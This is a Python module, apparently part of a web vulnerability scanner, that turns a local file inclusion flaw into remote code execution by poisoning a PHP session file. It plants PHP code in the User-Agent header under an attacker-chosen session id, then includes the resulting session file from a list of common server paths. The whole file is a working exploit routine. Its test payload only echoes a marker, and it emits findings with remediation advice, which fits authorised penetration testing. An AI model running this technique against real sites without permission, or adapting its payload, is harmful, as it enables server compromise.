"""
LFI -> RCE via PHP session poisoning.

PHP serialises ``$_SESSION`` to a file named ``sess_<PHPSESSID>`` under the
session save path. Because PHP accepts a client-supplied session id by default,
an attacker can:

1. choose their own ``PHPSESSID``;
2. get attacker-controlled data written into the session (commonly the
   ``User-Agent``, which many apps store) via that session id; and
3. include the resulting ``sess_<id>`` file through the confirmed LFI.

If the poisoned value contains PHP, inclusion executes it. This technique reuses
the traversal prefix already confirmed during detection, tries the common
session save paths, and verifies execution with a unique marker using the same
reflection/error-aware check as the other RCE techniques.
"""
from __future__ import annotations

import re
import secrets
from typing import Iterator, List

from lfimachine.core.result import Finding, Severity
from lfimachine.techniques.base import Technique, TechniqueContext
from lfimachine.techniques.log_poison import _traversal_prefix

# Common session save paths across distros / installs.
_SESSION_DIRS = [
    "var/lib/php/sessions",
    "var/lib/php/session",
    "var/lib/php5",
    "var/lib/php",
    "tmp",
    "var/tmp",
    "var/www/sessions",
    "var/php/session",
]

_PHP_ERROR = re.compile(
    r"(Warning|Fatal error|Notice|Parse error)\s*:"
    r"|Failed opening|failed to open stream|Unable to (find|create)",
    re.IGNORECASE,
)


class SessionPoisonTechnique(Technique):
    name = "session-poisoning"
    description = "LFI to RCE by poisoning a PHP session file"
    priority = 26
    requires_inclusion = True

    def applicable(self, ctx: TechniqueContext) -> bool:
        os_name = ctx.os_confirmed or ctx.fingerprint.os
        php = ctx.fingerprint.php or ctx.fingerprint.language in (None, "php")
        return ctx.rce and ctx.confirmed_traversal is not None and php and os_name != "windows"

    def _executed(self, text: str, marker: str) -> bool:
        if not text or marker not in text:
            return False
        if _PHP_ERROR.search(text):
            return False
        if f"echo '{marker}'" in text or f"echo {marker}" in text:
            return False
        return True

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        prefix = _traversal_prefix(ctx)
        if prefix is None:
            return

        sid = "lfimx" + secrets.token_hex(8)
        marker = "SPX" + secrets.token_hex(4)
        payload = f"<?php echo '{marker}';?>"

        # Step 1: write the payload into the session for a session id we control.
        headers = dict(ctx.point.base_headers)
        headers["User-Agent"] = payload
        headers["Cookie"] = self._merge_cookie(headers.get("Cookie"), f"PHPSESSID={sid}")
        ctx.client.request(ctx.point.method, ctx.point.url,
                           params=ctx.point.base_params or None, headers=headers)

        # Step 2: include the session file via the confirmed traversal.
        for sdir in _SESSION_DIRS:
            target = f"{prefix}{sdir}/sess_{sid}"
            resp = ctx.point.send(ctx.client, target)
            if not resp.ok:
                continue
            if self._executed(resp.text, marker):
                log.good(f"RCE via session poisoning: {sdir}/sess_{sid}")
                yield Finding(
                    technique=self.name,
                    title=f"Remote Code Execution via PHP session poisoning",
                    severity=Severity.CRITICAL,
                    confidence=0.9,
                    url=resp.url or ctx.point.url,
                    parameter=ctx.point.parameter or "<path>",
                    method=ctx.point.method,
                    payload=target,
                    evidence=f"marker {marker} executed from sess_{sid} in /{sdir}",
                    os_guess="linux",
                    status_code=resp.status_code,
                    response_length=resp.length,
                    remediation=(
                        "Prevent user input from reaching include paths; store "
                        "sessions outside the web root and pin the session id."
                    ),
                    extra={"session_dir": sdir, "code_exec": True},
                )
                if ctx.stop_on_first:
                    return

    @staticmethod
    def _merge_cookie(existing: str | None, extra: str) -> str:
        return f"{existing}; {extra}" if existing else extra
